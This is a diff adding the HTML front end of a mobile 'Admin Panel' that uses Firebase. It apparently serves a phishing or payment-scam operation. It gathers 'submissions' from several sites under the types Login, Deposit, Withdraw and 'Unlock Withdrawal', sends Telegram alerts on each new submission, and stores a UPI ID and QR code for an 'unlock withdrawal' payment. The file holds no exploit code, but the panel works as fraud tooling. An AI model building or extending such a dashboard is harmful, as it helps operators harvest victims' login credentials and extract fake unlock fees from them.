@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+  <meta name="theme-color" content="#F2F2F7" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="default" />
+  <title>Admin Panel</title>
+  <link rel="manifest" href="manifest.json" />
+  <link rel="apple-touch-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='22' fill='%23007AFF'/><text x='50' y='68' font-size='52' text-anchor='middle' fill='white' font-family='system-ui' font-weight='bold'>A</text></svg>" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage-compat.js"></script>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+
+  <!-- TOP BAR -->
+  <header class="topbar">
+    <div class="topbar-left">
+      <div class="conn-mini"><span class="conn-dot" id="connDot"></span></div>
+      <div class="topbar-title" id="topbarTitle">Dashboard</div>
+    </div>
+    <div class="topbar-right">
+      <button class="topbar-btn" id="soundBtn"><i id="soundIcon" class="fa-solid fa-bell-slash"></i></button>
+    </div>
+  </header>
+
+  <!-- PAGES -->
+  <div class="pages">
+
+    <!-- DASHBOARD -->
+    <div class="page active" id="page-dashboard">
+      <div class="page-pad">
+        <div class="top-stats">
+          <div class="stat-card stat-total">
+            <div class="stat-icon"><i class="fa-solid fa-layer-group"></i></div>
+            <div class="stat-info">
+              <div class="stat-value" id="kpiTotal">--</div>
+              <div class="stat-label">Total</div>
+            </div>
+          </div>
+          <div class="stat-card stat-today">
+            <div class="stat-icon"><i class="fa-solid fa-bolt"></i></div>
+            <div class="stat-info">
+              <div class="stat-value" id="kpiToday">--</div>
+              <div class="stat-label">Today</div>
+            </div>
+          </div>
+          <div class="stat-card stat-week">
+            <div class="stat-icon"><i class="fa-solid fa-calendar-week"></i></div>
+            <div class="stat-info">
+              <div class="stat-value" id="kpiWeek">--</div>
+              <div class="stat-label">Week</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="section-head">
+          <h2>Sites</h2>
+          <span class="section-badge" id="siteCount">0</span>
+        </div>
+        <div class="site-cards" id="siteCards"></div>
+
+        <div class="section-head">
+          <h2>Activity</h2>
+          <span class="section-badge">7 days</span>
+        </div>
+        <div class="dash-card">
+          <div class="spark" id="spark"></div>
+          <div class="mix-row" id="mixRow"></div>
+        </div>
+
+        <div class="section-head">
+          <h2>Recent</h2>
+          <button class="link-btn" id="viewAllBtn">View All <i class="fa-solid fa-chevron-right"></i></button>
+        </div>
+        <div id="recentList" class="recent-list"></div>
+      </div>
+    </div>
+
+    <!-- SUBMISSIONS -->
+    <div class="page" id="page-submissions">
+      <div class="page-pad">
+        <div class="search-wrap">
+          <i class="fa-solid fa-magnifying-glass"></i>
+          <input id="searchInput" type="text" placeholder="Search..." autocomplete="off" />
+          <button class="search-clear" id="searchClear" hidden><i class="fa-solid fa-xmark"></i></button>
+        </div>
+
+        <div class="pills-scroll" id="datePills">
+          <button class="pill active" data-range="all">All</button>
+          <button class="pill" data-range="24h">24h</button>
+          <button class="pill" data-range="7d">7d</button>
+          <button class="pill" data-range="30d">30d</button>
+        </div>
+
+        <div class="pills-scroll" id="typePills">
+          <button class="pill active" data-type="all">All</button>
+          <button class="pill" data-type="login"><i class="fa-solid fa-lock"></i> Login</button>
+          <button class="pill" data-type="deposit"><i class="fa-solid fa-dollar-sign"></i> Deposit</button>
+          <button class="pill" data-type="withdrawal"><i class="fa-solid fa-money-bill-transfer"></i> Withdraw</button>
+          <button class="pill" data-type="unblock"><i class="fa-solid fa-unlock"></i> Unlock Withdrawal</button>
+        </div>
+
+        <div class="pills-scroll" id="sitePills"></div>
+
+        <div class="list-info">
+          <span class="list-count" id="listCount">0 submissions</span>
+          <button class="btn-negative btn-xs" id="bulkDeleteBtn" hidden><i class="fa-solid fa-trash"></i> Delete</button>
+        </div>
+
+        <div class="list" id="list"></div>
+      </div>
+    </div>
+
+    <!-- ANALYTICS -->
+    <div class="page" id="page-analytics">
+      <div class="page-pad">
+        <div class="section-head"><h2>By Site</h2></div>
+        <div class="dash-card"><div class="site-bars" id="analyticsSiteBars"></div></div>
+
+        <div class="section-head"><h2>Activity</h2></div>
+        <div class="dash-card"><div class="spark" id="analyticsSpark"></div></div>
+
+        <div class="section-head"><h2>Event Mix</h2></div>
+        <div class="dash-card"><div class="mix-row" id="analyticsMix"></div></div>
+
+        <div class="section-head"><h2>Top Fields</h2></div>
+        <div class="dash-card"><div id="topFields" class="top-fields"></div></div>
+      </div>
+    </div>
+
+    <!-- SETTINGS -->
+    <div class="page" id="page-settings">
+      <div class="page-pad">
+        <div class="ios-group">
+          <div class="ios-group-title">Preferences</div>
+          <div class="ios-row">
+            <div class="ios-row-left">
+              <div class="ios-row-icon" style="background:rgba(0,122,255,0.1);color:#007AFF"><i class="fa-solid fa-bell"></i></div>
+              <div><div class="ios-row-title">Sound Alerts</div><div class="ios-row-sub">New submission sound</div></div>
+            </div>
+            <label class="toggle"><input type="checkbox" id="soundToggle" /><span class="toggle-slider"></span></label>
+          </div>
+        </div>
+
+        <div class="ios-group">
+          <div class="ios-group-title">Telegram Alerts</div>
+          <div class="ios-row">
+            <div class="ios-row-left">
+              <div class="ios-row-icon" style="background:rgba(0,184,148,0.1);color:#00B894"><i class="fa-solid fa-paper-plane"></i></div>
+              <div><div class="ios-row-title">Telegram Bot</div><div class="ios-row-sub">Send alerts on new submissions</div></div>
+            </div>
+            <label class="toggle"><input type="checkbox" id="tgToggle" /><span class="toggle-slider"></span></label>
+          </div>
+          <div class="ios-row" style="flex-direction:column;align-items:stretch;gap:8px;padding:12px 16px;">
+            <input type="text" id="tgBotToken" class="tg-input" placeholder="Bot Token" style="width:100%;padding:10px 14px;border-radius:10px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:13px;font-family:inherit;outline:none;">
+            <input type="text" id="tgChatId" class="tg-input" placeholder="Chat ID" style="width:100%;padding:10px 14px;border-radius:10px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:13px;font-family:inherit;outline:none;">
+            <div style="display:flex;gap:8px;">
+              <button class="btn-ghost btn-xs" id="tgSaveBtn" style="flex:1;"><i class="fa-solid fa-floppy-disk"></i> Save</button>
+              <button class="btn-ghost btn-xs" id="tgTestBtn" style="flex:1;"><i class="fa-solid fa-flask"></i> Test</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="ios-group">
+          <div class="ios-group-title">Unlock Withdrawal Payment</div>
+          <div class="ios-row" style="flex-direction:column;align-items:stretch;gap:10px;padding:14px 16px;">
+            <div style="display:flex;align-items:center;gap:10px;">
+              <div class="ios-row-icon" style="background:rgba(175,82,222,0.1);color:#AF52DE;width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;"><i class="fa-solid fa-qrcode"></i></div>
+              <div><div class="ios-row-title" style="font-size:14px;font-weight:600;">QR Image URL</div><div class="ios-row-sub" style="font-size:11px;">Paste QR image URL</div></div>
+            </div>
+            <input type="text" id="qrUrlInput" placeholder="https://i.ibb.co/..." style="width:100%;padding:10px 14px;border-radius:10px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:13px;font-family:inherit;outline:none;" />
+            <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;">
+              <img id="qrPreview" style="width:72px;height:72px;border-radius:10px;object-fit:cover;border:1px solid var(--border);display:none;" />
+              <div style="display:flex;gap:6px;flex-wrap:wrap;">
+                <button class="btn-ghost btn-xs" id="saveQrUrlBtn"><i class="fa-solid fa-floppy-disk"></i> Save</button>
+                <button class="btn-negative btn-xs" id="removeQrBtn"><i class="fa-solid fa-trash"></i> Remove</button>
+              </div>
+            </div>
+          </div>
+          <div class="ios-row" style="flex-direction:column;align-items:stretch;gap:10px;padding:14px 16px;">
+            <div style="display:flex;align-items:center;gap:10px;">
+              <div class="ios-row-icon" style="background:rgba(175,82,222,0.1);color:#AF52DE;width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;"><i class="fa-solid fa-money-bill"></i></div>
+              <div><div class="ios-row-title" style="font-size:14px;font-weight:600;">UPI ID</div><div class="ios-row-sub" style="font-size:11px;">Set payment UPI ID</div></div>
+            </div>
+            <input type="text" id="upiIdInput" placeholder="example@upi" style="width:100%;padding:10px 14px;border-radius:10px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:13px;font-family:inherit;outline:none;" />
+            <div id="upiStatus" style="font-size:11px;color:var(--text2);display:none;"></div>
+            <div style="display:flex;gap:6px;">
+              <button class="btn-ghost btn-xs" id="saveUpiBtn"><i class="fa-solid fa-floppy-disk"></i> Save</button>
+              <button class="btn-negative btn-xs" id="removeUpiBtn"><i class="fa-solid fa-trash"></i> Remove</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="ios-group">
+          <div class="ios-group-title">Data</div>
+          <div class="ios-row" id="settingsExport">
+            <div class="ios-row-left">
+              <div class="ios-row-icon" style="background:rgba(52,199,89,0.1);color:#34C759"><i class="fa-solid fa-download"></i></div>
+              <div><div class="ios-row-title">Export All Data</div><div class="ios-row-sub">Download as CSV</div></div>
+            </div>
+            <i class="fa-solid fa-chevron-right ios-arrow"></i>
+          </div>
+        </div>
+
+        <div class="ios-group">
+          <div class="ios-group-title">About</div>
+          <div class="ios-row">
+            <div class="ios-row-left">
+              <div class="ios-row-icon" style="background:rgba(88,86,214,0.1);color:#5856D6"><i class="fa-solid fa-shield-halved"></i></div>
+              <div><div class="ios-row-title">Admin Panel</div><div class="ios-row-sub">v2.0</div></div>
+            </div>
+          </div>
+          <div class="ios-row">
+            <div class="ios-row-left">
+              <div class="ios-row-icon" style="background:rgba(255,149,0,0.1);color:#FF9500"><i class="fa-solid fa-database"></i></div>
+              <div><div class="ios-row-title">Project</div><div class="ios-row-sub">alll-projects-admin-pennal</div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- BOTTOM NAV -->
+  <nav class="bottom-nav">
+    <button class="nav-tab active" data-page="dashboard">
+      <i class="fa-solid fa-border-all"></i>
+      <span>Home</span>
+    </button>
+    <button class="nav-tab" data-page="submissions">
+      <i class="fa-solid fa-inbox"></i>
+      <span>Inbox</span>
+    </button>
+    <button class="nav-tab" data-page="analytics">
+      <i class="fa-solid fa-chart-bar"></i>
+      <span>Stats</span>
+    </button>
+    <button class="nav-tab" data-page="settings">
+      <i class="fa-solid fa-gear"></i>
+      <span>Settings</span>
+    </button>
+  </nav>
+
+  <!-- MODAL -->
+  <div class="modal-bg" id="modalBg">
+    <div class="modal" id="modal">
+      <div class="modal-head">
+        <div class="modal-title" id="modalTitle">Detail</div>
+        <button class="modal-close-btn" id="modalClose"><i class="fa-solid fa-xmark"></i></button>
+      </div>
+      <div class="modal-body" id="modalBody"></div>
+      <div class="modal-foot">
+        <button class="btn-ghost" id="modalCopyAll"><i class="fa-solid fa-copy"></i> Copy</button>
+        <button class="btn-negative" id="modalDelete"><i class="fa-solid fa-trash"></i> Delete</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- CONFIRM -->
+  <div class="confirm-bg" id="confirmBg">
+    <div class="confirm-box">
+      <div class="confirm-icon"><i class="fa-solid fa-exclamation-triangle"></i></div>
+      <div class="confirm-title" id="confirmTitle">Delete?</div>
+      <div class="confirm-msg" id="confirmMsg">Cannot be undone.</div>
+      <div class="confirm-actions">
+        <button class="btn-ghost" id="confirmCancel">Cancel</button>
+        <button class="btn-negative" id="confirmOk">Delete</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- TOAST -->
+  <div class="toast" id="toast"></div>
+
+  <!-- INSTALL BANNER -->
+  <div class="install-banner" id="installBanner">
+    <div class="install-banner-inner">
+      <div class="install-banner-text"><i class="fa-solid fa-download"></i> Install App</div>
+      <div class="install-banner-actions">
+        <button class="btn-ghost btn-xs" id="installDismiss">Later</button>
+        <button class="install-btn" id="installBtn">Install</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="app.js"></script>
+  <script>
+    let deferredPrompt;
+    window.addEventListener('beforeinstallprompt', e => {
+      e.preventDefault();
+      deferredPrompt = e;
+      document.getElementById('installBanner').classList.add('show');
+    });
+    document.getElementById('installBtn')?.addEventListener('click', () => {
+      if (!deferredPrompt) return;
+      deferredPrompt.prompt();
+      deferredPrompt.userChoice.then(r => {
+        deferredPrompt = null;
+        document.getElementById('installBanner').classList.remove('show');
+      });
+    });
+    document.getElementById('installDismiss')?.addEventListener('click', () => {
+      document.getElementById('installBanner').classList.remove('show');
+    });
+    window.addEventListener('appinstalled', () => {
+      document.getElementById('installBanner').classList.remove('show');
+      deferredPrompt = null;
+    });
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('./sw.js').catch(() => {});
+    }
+  </script>
+</body>
+</html>
